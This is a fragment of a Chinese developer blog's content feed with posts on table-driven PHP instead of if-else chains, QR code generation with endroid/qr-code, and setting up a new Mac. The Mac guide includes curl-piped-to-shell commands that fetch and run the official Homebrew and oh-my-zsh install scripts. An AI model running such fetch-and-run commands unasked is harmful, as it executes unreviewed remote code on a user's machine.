<span class="string">"USA"</span>,</span><br><span class="line">     <span class="string">"美国"</span>=&gt; <span class="string">"USA"</span>,</span><br><span class="line">   ];</span><br></pre></td></tr></table></figure><p>就算原始数据花样丰富，最终数据必须格式化成如此。</p><p>然而如果是逻辑的话，人一多，逻辑方法就可能发生变化。你可能指望对方这样写代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($country===<span class="string">"China"</span> )&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">"CHN"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($country===<span class="string">"America"</span>)&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">"USA"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($country===<span class="string">"Japan"</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"JPN"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($country===<span class="string">"US"</span>)&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">"USA"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($country===<span class="string">"United States of America"</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"USA"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($country===<span class="string">"美国"</span>)&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">"USA"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">"OTHER"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而，对方可能会这样写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ($country === <span class="string">"China"</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">"CHN"</span>;</span><br><span class="line"> &#125; <span class="keyword">else</span> <span class="keyword">if</span> (in_array($country, [<span class="string">"America"</span>, <span class="string">"US"</span>, <span class="string">"United States of America"</span>, <span class="string">"美国"</span>])) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">"USA"</span>;</span><br><span class="line"> &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($country === <span class="string">"Japan"</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">"JPN"</span>;</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后来多了一个日本的需求，又交给不同的人去完成，说不定最后会写成这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ($country === <span class="string">"China"</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">"CHN"</span>;</span><br><span class="line"> &#125; <span class="keyword">else</span> <span class="keyword">if</span> (in_array($country, [<span class="string">"America"</span>, <span class="string">"US"</span>, <span class="string">"United States of America"</span>, <span class="string">"美国"</span>])) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">"USA"</span>;</span><br><span class="line"> &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($country === <span class="string">"Japan"</span>||$country === <span class="string">"日本"</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">"JPN"</span>;</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>怎样写，都没有错，然而风格却大相径庭。在多人合作编程过程中，无法控制所有人的风格，如果需要统一风格，必须依靠代码审查，这需要大量资源和成本。</p><p>另外，就是因为如此，所有和 if else 相关的逻辑在单元测试中必须进行一次测试，才能有代码覆盖率；而如果是数据，由于数据格式的可控性，无需对数据进行测试。所以说：</p><ul><li>在多人开发的项目中，逻辑无序而不可控；数据格式有序而极易控制</li><li>在单元测试中，逻辑区块必须进行测试；而数据本身无需测试</li></ul><h2 id="提前返回"><a href="#提前返回" class="headerlink" title="提前返回"></a>提前返回</h2><p>这也许是初级开发人员很容易犯的错误之一。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHi</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>($name))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hi"</span> . $name;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// do something else</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要删除完全不必要的 Else 块，即可简化此过程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>($name))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hi"</span> . $name;</span><br><span class="line">  &#125; </span><br><span class="line">  </span><br><span class="line">  <span class="comment">// do something else</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>像这种条件单一的场景，满足某个条件的情况下执行某些操作并立即返回（提前<code>return</code>）是很好地解决方案。</p><h2 id="表驱动法"><a href="#表驱动法" class="headerlink" title="表驱动法"></a>表驱动法</h2><p>下面的案例是另外一个比较常见的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">($input)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ($input == <span class="number">0</span>)&#123;</span><br><span class="line">    $gender = <span class="string">"woman"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($input == <span class="number">1</span>)&#123;</span><br><span class="line">    $gender = <span class="string">"man"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $gender = <span class="string">"unknown"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> $gender;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>像这样的<code>If-Else</code> 语句，可以看到<code>key</code> 和<code>value</code> 是一一对应的，所以可以这样写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">($input)</span></span>&#123;</span><br><span class="line">  $map = [</span><br><span class="line">      <span class="number">0</span> =&gt; <span class="string">"woman"</span>,</span><br><span class="line">      <span class="number">1</span> =&gt; <span class="string">"man"</span>,</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  ];</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> !<span class="keyword">empty</span>($map[$input]) ? $map[$input] : <span class="string">"unknown"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://learnku.com/laravel/t/2712/the-meaning-of-the-if-else-code-style-into-the-table-driven-method" target="_blank" rel="noopener">caoglish—把 if-else 的代码风格改成表格驱动法的意义</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何在 PHP 中生成二维码</title>
      <link href="/how-to-generate-qr-code-in-php/"/>
      <url>/how-to-generate-qr-code-in-php/</url>
      
        <content type="html"><![CDATA[<h1 id="如何在-PHP-中生成二维码"><a href="#如何在-PHP-中生成二维码" class="headerlink" title="如何在 PHP 中生成二维码"></a>如何在 PHP 中生成二维码</h1><p>原生 PHP 无法直接生成二维码，可以借助一些第三方的二维码库。这里使用 <a href="https://github.com/endroid/qr-code" target="_blank" rel="noopener">endroid/qr-code</a>。</p><a id="more"></a><p>安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require endroid/qr-code</span><br></pre></td></tr></table></figure><p>首先来了解一下二维码的一些基本特征</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220326100220.png" alt=""></p><p>这是一张常见的二维码，由以下几部分构成：</p><ul><li>①：外框</li><li>②：码眼</li><li>③：码点</li><li>④：logo</li><li>⑤：文字</li></ul><p>其中码眼和码点是必要的，其余部分则均是为二维码美化的而添加的，非必要。</p><h2 id="简单的二维码生成"><a href="#简单的二维码生成" class="headerlink" title="简单的二维码生成"></a>简单的二维码生成</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">"vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Endroid</span>\<span class="title">QrCode</span>\<span class="title">QrCode</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Endroid</span>\<span class="title">QrCode</span>\<span class="title">Writer</span>\<span class="title">PngWriter</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建二维码</span></span><br><span class="line">$qr = QrCode::create(<span class="string">"Hello World"</span>);</span><br><span class="line">$writer = <span class="keyword">new</span> PngWriter();</span><br><span class="line">$result = $writer-&gt;write($qr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出二维码（方式一）</span></span><br><span class="line">$result-&gt;saveToFile(<span class="keyword">__DIR__</span> . <span class="string">"/qr.png"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式二</span></span><br><span class="line"><span class="comment">// header("Content-Type: " . $result-&gt;getMimeType());</span></span><br><span class="line"><span class="comment">// echo $result-&gt;getString();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式三</span></span><br><span class="line"><span class="comment">// echo "&lt;img src='&#123;$result-&gt;getDataUri()&#125;'/&gt;";</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220326130344.png" alt=""></p><p><code>endroid/qr-code</code> 提供三种不同的输出模式：</p><ul><li><code>saveToFile()</code>：生成二维码以图片的形式保存在本地</li><li><code>getString()</code>：直接输出在浏览器</li><li><code>getDataUri()</code>：输出二维码图片对应的 Base64</li></ul><h2 id="二维码美化"><a href="#二维码美化" class="headerlink" title="二维码美化"></a>二维码美化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Endroid</span>\<span class="title">QrCode</span>\<span class="title">QrCode</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Endroid</span>\<span class="title">QrCode</span>\<span class="title">Writer</span>\<span class="title">PngWriter</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Endroid</span>\<span class="title">QrCode</span>\<span class="title">ErrorCorrectionLevel</span>\<span class="title">ErrorCorrectionLevelHigh</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Endroid</span>\<span class="title">QrCode</span>\<span class="title">Color</span>\<span class="title">Color</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Endroid</span>\<span class="title">QrCode</span>\<span class="title">Logo</span>\<span class="title">Logo</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Endroid</span>\<span class="title">QrCode</span>\<span class="title">Label</span>\<span class="title">Label</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建二维码</span></span><br><span class="line">$qr = QrCode::create(<span class="string">"Hello World"</span>)</span><br><span class="line">    <span class="comment">// 设置容错等级</span></span><br><span class="line">    -&gt;setErrorCorrectionLevel(<span class="keyword">new</span> ErrorCorrectionLevelHigh())</span><br><span class="line">    <span class="comment">// 设置内容区域宽高，默认为300</span></span><br><span class="line">    -&gt;setSize(<span class="number">300</span>)</span><br><span class="line">    <span class="comment">// 设置外边距，默认为10</span></span><br><span class="line">    -&gt;setMargin(<span class="number">10</span>)</span><br><span class="line">    <span class="comment">// 设置二维码颜色，默认为黑色</span></span><br><span class="line">    -&gt;setForegroundColor(<span class="keyword">new</span> Color(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="comment">// 设置二维码背景色，默认为白色</span></span><br><span class="line">    -&gt;setBackgroundColor(<span class="keyword">new</span> Color(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置 logo</span></span><br><span class="line">$logo = Logo::create(<span class="keyword">__DIR__</span> . <span class="string">"/logo.png"</span>)</span><br><span class="line">    <span class="comment">// 设置 logo 大小</span></span><br><span class="line">    -&gt;setResizeToWidth(<span class="number">70</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置二维码下方的文字</span></span><br><span class="line">$label = Label::create(<span class="string">"扫一扫"</span>)</span><br><span class="line">    <span class="comment">// 设置文字颜色</span></span><br><span class="line">    -&gt;setTextColor(<span class="keyword">new</span> Color(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出二维码</span></span><br><span class="line">$writer = <span class="keyword">new</span> PngWriter();</span><br><span class="line">$result = $writer-&gt;write($qr, $logo, $label);</span><br><span class="line">header(<span class="string">"Content-Type: "</span> . $result-&gt;getMimeType());</span><br><span class="line"><span class="keyword">echo</span> $result-&gt;getString();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220326155401.png" alt=""></p><p>创建二维码时，除了可以放文本，还可以放入 URL、邮箱、深度链接等等。</p><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><p>endroid/qr-code 似乎不支持外框、码眼、码点的自定义，具体可以查看这个 <a href="https://github.com/endroid/qr-code/issues/196" target="_blank" rel="noopener">Issue</a>。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://code-boxx.com/generate-qr-code-php/" target="_blank" rel="noopener">generate-qr-code-php</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>假如我有一台新的 Mac</title>
      <link href="/Suppose-I-have-a-new-Mac/"/>
      <url>/Suppose-I-have-a-new-Mac/</url>
      
        <content type="html"><![CDATA[<p>从去年就想入手一台新的MacBookPro，中间因为一些原因，没有第一时间选择从官网下单，而是让朋友帮忙从其他渠道代购。</p><p>这一等就是好几个月，直到二月初才拿到货…</p><p>好了，现在我们真的有了一台新 Mac。正式开始之前，请自行准备科学上网环境，本文不使用任何代理源。</p><a id="more"></a><h2 id="触控板和键位配置"><a href="#触控板和键位配置" class="headerlink" title="触控板和键位配置"></a>触控板和键位配置</h2><h3 id="三指拖移"><a href="#三指拖移" class="headerlink" title="三指拖移"></a>三指拖移</h3><p>Mac 的三指拖移手势能够大大的提高触摸板的使用频率，减少触控板左下角按键的左键功能使用，但默认是没有启用的。</p><p>所以我通常拿到一台新Mac 的第一件事情就是打开三指拖移。</p><p>按以下路径找到对应的设置面板：<code>系统设置偏好 -&gt; 辅助功能 -&gt; 指针选项 -&gt; 触控板选项</code></p><p><img src="https://wxnacy.com/images/mac-chukong2.png" alt=""></p><p>点击启用即可。</p><h3 id="键盘改键"><a href="#键盘改键" class="headerlink" title="键盘改键"></a>键盘改键</h3><p>新款的MacBook 的剪刀键盘，有好几个不常用键占据了非常重要的位置，这是肯定不能接受的。</p><p>具体的改键过程，请查阅<a href="https://www.0x2beace.com/how-to-change-the-keyboard-on-a-mac/">这篇笔记</a>。</p><h2 id="命令行工具"><a href="#命令行工具" class="headerlink" title="命令行工具"></a>命令行工具</h2><h3 id="Homebrew"><a href="#Homebrew" class="headerlink" title="Homebrew"></a>Homebrew</h3><p>经常与终端打交道的用户，对这个一定不陌生，它就是类似<code>Ubuntu</code>下的 <code>apt-get</code> 这样的包管理工具。</p><p>通常我需要搭建一个全新的开发环境时，它一定是第一个需要安装的工具。</p><p>打开终端，执行以下命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c <span class="string">"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"</span></span><br></pre></td></tr></table></figure><p>常用命令如下：</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>brew search package</td><td>搜索软件包</td></tr><tr><td>brew install package</td><td>安装软件包</td></tr><tr><td>brew uninstall package</td><td>卸载软件包</td></tr><tr><td>brew list</td><td>列出已安装清单</td></tr><tr><td>brew services list</td><td>列出使用brew 运行的服务</td></tr><tr><td>brew upgrade xxx</td><td>升级软件</td></tr><tr><td>brew info nginx</td><td>查看软件包详情</td></tr><tr><td>brew help</td><td>获取帮助</td></tr><tr><td>brew tap homebrew/php</td><td>更新Homebrew 安装源</td></tr><tr><td>brew link <a href="mailto:php@7.3">php@7.3</a></td><td>手动创建符号链接Cellar</td></tr><tr><td>brew unlink <a href="mailto:php@7.3">php@7.3</a></td><td>取消链接</td></tr></tbody></table><p><a href="https://brew.sh/index_zh-cn" target="_blank" rel="noopener">homebrew</a> 的重要性就不必多说了，Mac 下必装工具之一。</p><p>如果在安装<code>homebrew</code> 的过程中，因为众所周知的原因导致安装失败，可以看一下下面两篇笔记，说不定会有帮助：</p><ul><li><a href="https://www.0x2beace.com/how-to-make-terminal-commands-go-through-proxy/">如何让终端命令走代理</a></li><li><a href="https://www.0x2beace.com/How-to-solve-problems-like-curl-7-Failed-to-connect-to-raw-githubusercontent-com-port-443-Connection-refused/">如何解决类似 curl:(7) Failed to connect to raw.githubusercontent.com port 443:Connection refused 的问题</a></li></ul><h3 id="Homebrew-Cask"><a href="#Homebrew-Cask" class="headerlink" title="Homebrew Cask"></a>Homebrew Cask</h3><p>Homebrew Cask扩展了Homebrew，使得macOS GUI 应用程序的安装和管理更优雅、简单和快速。</p><p>看看官方的实例图：</p><p><img src="https://camo.githubusercontent.com/f8b75a5e461338a90db6acf4db8f5bc9cf620bfba65a5a490ed10bd08f457b52/68747470733a2f2f692e696d6775722e636f6d2f464e4e4d36574c2e676966" alt=""></p><p>Homebrew Cask 先下载软件后解压到统一的目录中 <code>/opt/homebrew-cask/Caskroom</code>，然后再软链到 <code>~/Applications/</code> 目录下，省掉了自己下载、解压、拖拽安装等步骤，同样的，卸载相当简单和干净，一句命令就可以完成。</p><p>更多Homebrew Cask 的用法请<a href="https://github.com/Homebrew/homebrew-cask/blob/master/USAGE.md" target="_blank" rel="noopener">自行查阅</a>。</p><h3 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h3><p>zsh 是一种shell语言，兼容bash，提供强大的命令行功能，比如tab补全，自动纠错功能等。</p><p>安装 zsh：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install zsh</span><br></pre></td></tr></table></figure><p><code>oh-my-zsh</code>则是基于<code>zsh</code> 命令行，提供了主题配置，插件机制等便捷操作，将<code>zsh</code> 变得更加强大。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.github.com&#x2F;robbyrussell&#x2F;oh-my-zsh&#x2F;master&#x2F;tools&#x2F;install.sh)&quot;</span><br></pre></td></tr></table></figure><p>个性化配置、别名配置、插件启用都在目录 <code>~/.zshrc</code> 下，可以自行扩展。</p><h4 id="让终端走代理"><a href="#让终端走代理" class="headerlink" title="让终端走代理"></a>让终端走代理</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> zsh</span></span><br><span class="line">echo export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890 &gt;&gt; ~/.zprofile</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> bash</span></span><br><span class="line">echo export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890 &gt;&gt; ~/.bash_profile</span><br></pre></td></tr></table></figure><h2 id="其他环境和插件"><a href="#其他环境和插件" class="headerlink" title="其他环境和插件"></a>其他环境和插件</h2><h3 id="Finder（访达）预览插件"><a href="#Finder（访达）预览插件" class="headerlink" title="Finder（访达）预览插件"></a>Finder（访达）预览插件</h3><p>用于Finder 快速显示文件的内容，这个工具的安装就是依靠<code>Homebrew Cask</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install qlcolorcode qlstephen qlmarkdown quicklook-json qlimagesize suspicious-package apparency quicklookase qlvideo</span><br></pre></td></tr></table></figure><ul><li>qlcolorcode: 代码文件预览时高亮</li><li>qlstephen: 以纯文本的形式预览无拓展名或者未知拓展名的文件</li><li>qlmarkdown: 预览渲染后的 markdown 文件</li><li>quicklook-json: 预览格式化后的 json 文件</li><li>ProvisionQL: ipa文件信息展示</li><li>QuickLookAPK：apk文件信息展示</li></ul><h3 id="macos-扩展"><a href="#macos-扩展" class="headerlink" title="macos 扩展"></a>macos 扩展</h3><p><code>macos</code> 扩展是<code>zsh</code> 提供的一个控制终端和访达（功能之一）的扩展工具。</p><p>启用方式很简单，直接编辑<code>~/.zshrc</code>，然后添加 <code>macos</code> 到插件列表即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plugins&#x3D;(</span><br><span class="line">    macos</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>其中最为常用是<code>ofd</code>命令，将当前<code>shell</code>窗口在访达中打开。</p><p>另一个较为常用的命令是<code>cdf</code>，可在<code>shell</code>中直接跳转至当前访达窗口所在的路径（如果存在多个访达窗口，那么跳转至最前面的那个）。</p><p>其他常用命令如下：</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>tab</td><td>在当前目录打开一个新窗口</td></tr><tr><td>split_tab</td><td>在当前窗口打开一个水平窗口</td></tr><tr><td>vsplit_tab</td><td>在当前窗口打开一个垂直窗口</td></tr><tr><td>ofd</td><td>在访达窗口中打开当前目录</td></tr><tr><td>pfd</td><td>返回最前面的访达窗口的路径</td></tr><tr><td>pfs</td><td>返回当前查找程序选择</td></tr><tr><td>cdf</td><td>cd 到当前访达窗口所在的路径</td></tr><tr><td>pushdf</td><td>pushed 到当前访达目录</td></tr><tr><td>quick-look</td><td>快速查看指定文件</td></tr><tr><td>man-preview</td><td>在预览应用程序中打开特定的手册页</td></tr><tr><td>showfiles</td><td>显示隐藏文件</td></tr><tr><td>hidefiles</td><td>隐藏隐藏的文件</td></tr><tr><td>rmdsstore</td><td>以递归方式删除目录中的.DS_Store文件</td></tr></tbody></table><h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><p><code>tmux</code> 是一个终端下窗口分割的工具，有关它的具体介绍，请查阅<a href="https://www.0x2beace.com/tmux-quick-start/">这篇笔记</a>。</p><h3 id="autojump"><a href="#autojump" class="headerlink" title="autojump"></a>autojump</h3><p>autojump - 目录快速跳转命令行工具，从此告别<code>cd... cd...</code>。</p><p>autojump 是一个<code>Windows</code>、<code>Linux</code>、<code>macOS</code> 都能使用的命令行工具，这是仅介绍<code>macOS</code> 的安装方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install autojump</span><br></pre></td></tr></table></figure><p>使用<code>brew</code>安装完成之后，还需要进行配置，以下方法二选一：</p><ul><li>在 <code>~/.bash_profile</code> 文件中加入语句 <code>[[ -s $(brew --prefix)/etc/profile.d/autojump.sh ]] &amp;&amp; . $(brew --prefix)/etc/profile.d/autojump.sh</code>。</li><li>在 <code>~/.zshrc</code> 文件中，修改 <code>plugins=(git)</code> 插件配置行，以开启 <code>zsh</code> 对 <code>autojump</code> 插件的支持 <code>plugins=(git autojump)</code>。</li></ul><p>其他常用命令如下：</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>j foo</td><td>跳转到包含 foo 的目录</td></tr><tr><td>jc bar</td><td>跳转到包含 bar 的子目录</td></tr><tr><td>jo file</td><td>在访达中打开包含 file 的目录</td></tr><tr><td>autojump –help</td><td>打开帮助列表</td></tr></tbody></table><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/ohmyzsh/ohmyzsh" target="_blank" rel="noopener">Oh My Zsh</a></li><li><a href="https://brew.sh" target="_blank" rel="noopener">Homebrew</a></li><li><a href="https://github.com/Homebrew/homebrew-cask" target="_blank" rel="noopener">Homebrew Cask</a></li><li><a href="https://github.com/sindresorhus/quick-look-plugins" target="_blank" rel="noopener">Quick Look plugins</a></li><li><a href="https://github.com/zsh-users" target="_blank" rel="noopener">zsh-users</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/macos" target="_blank" rel="noopener">MacOS plugin</a></li><li><a href="https://github.com/wting/autojump" target="_blank" rel="noopener">autojump</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mac </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>如何解决类似 curl:(7) Failed to connect to raw.githubusercontent.com port 443:Connection refused 的问题</title>
      <link href="/How-to-solve-problems-like-curl-7-Failed-to-connect-to-raw-githubusercontent-com-port-443-Connection-refused/"/>
      <url>/How-to-solve-problems-like-curl-7-Failed-to-connect-to-raw-githubusercontent-com-port-443-Connection-refused/</url>
      
